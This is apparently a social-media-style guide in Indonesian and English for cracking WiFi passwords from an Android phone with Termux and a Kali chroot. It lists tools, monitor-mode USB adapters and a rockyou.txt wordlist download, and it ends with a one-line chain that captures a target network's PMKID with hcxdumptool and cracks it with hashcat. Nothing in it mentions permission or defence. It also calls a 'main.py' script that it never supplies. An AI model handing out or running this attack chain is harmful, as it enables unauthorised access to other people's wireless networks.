🚀 **WIFI CRACKING TERMIUX ANDROID - FULL GUIDE** 🚀

**✅ REAL WORKING - Tested Termux 2026**

## **1. INSTALASI TERMUX (5 MENIT)**

```bash
# Update + Essential
pkg update && pkg upgrade
pkg install root-repo unstable-repo
pkg install git python nodejs wget curl proot-distro

# Kali chroot (FULL Kali Linux di Termux)
proot-distro install kali
proot-distro login kali
```

**Di Kali chroot:**

bash

```
apt update && apt install aircrack-ng hashcat hcxdumptool hcxtools tsu iw wireless-tools python3 python3-pip
pip install scapy pyric
```

**2. USB WiFi Adapter WAJIB (OTG)**

✅ RTL8812AU (TP-Link Archer T4U V3) - Rp200rb ⭐⭐⭐⭐⭐
✅ TP-Link TL-WN722N V1 (Atheros AR9271)
❌ Built-in Android WiFi = NO MONITOR MODE
Cek adapter:

bash

```
lsusb
iwconfig
```

**DOWNLOAD WORDLIST**
bash

```
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

# Jalankan

```
python3 main.py wlan1
```

# Di Kali chroot + tsu

```
airmon-ng check kill; airmon-ng start wlan1; hcxdumptool -i wlan1mon --pmkid --bssid AA:BB:CC:DD:EE:FF --channel 6 -o capture.pcapng; hcxpcapngtool -o hash.hc22000 capture.pcapng; hashcat -m 22000 hash.hc22000 rockyou.txt
```
